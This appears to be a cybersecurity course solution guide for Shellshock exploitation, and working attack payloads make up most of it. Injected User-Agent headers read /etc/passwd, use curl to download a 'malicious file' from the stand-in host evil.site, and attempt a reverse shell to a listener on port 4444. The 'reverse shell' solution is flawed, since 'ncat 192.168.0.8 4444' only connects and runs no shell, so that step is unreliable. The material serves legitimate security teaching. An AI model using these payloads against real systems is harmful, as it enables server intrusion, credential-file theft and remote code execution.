## Solution Guide: Shellshock Payloads

In this activity, you wrote template scripts that can be used to exploit the Shellshock vulnerability.

Use the below example that we covered in the previous section:

  ```bash
  GET /index.html HTTP/1.1
  Host: example.com
  User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'
  Connection: keep-alive
  ```

* This exploit will cat `etc/passwd`.
* Remember: With this template, al you need to update for each exploit is the code that comes after `() { :;}; /bin/bash -c`  in `User-Agent`. 



### Instructions

Open a text editor and write Shellshock payloads for the  tasks below. You may need to do additional research to complete the code injections. 

1. Read `/etc/passwd`.
   - Solution: `User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'`

2. Use `curl` to download a malicious file from `http://evil.site/mal.php`.
   - Solution: `User-Agent: () { :;}; /bin/bash -c 'curl -O http://evil.site/mal.php'`

3. Open a netcat/ncat listener on your host's port `4444`. 
   - Solution: `ncat -lvp 4444`

4. Send a reverse shell to your port 4444 (in this example, use the IP address `192.168.0.8`). 
   - Solution: `User-Agent: () { :;}; /bin/bash -c 'ncat 192.168.0.8 4444'`

---
&copy; 2020 Trilogy Education Services, a 2U Inc Brand.  All Rights Reserved.
